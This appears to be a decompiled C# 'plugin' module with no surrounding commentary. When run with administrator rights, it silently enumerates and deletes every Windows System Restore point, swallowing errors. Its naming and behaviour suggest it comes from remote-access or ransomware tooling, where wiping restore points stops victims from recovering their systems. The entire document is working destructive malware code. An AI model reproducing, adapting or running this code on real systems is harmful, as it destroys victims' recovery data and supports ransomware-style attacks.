using System;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.VisualBasic.CompilerServices;

namespace Plugin;

public class DeletePoints
{
	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	public static void Run()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		ManagementObjectCollection instances = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances();
		try
		{
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(((ManagementBaseObject)(ManagementObject)enumerator.Current)["sequencenumber"]).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
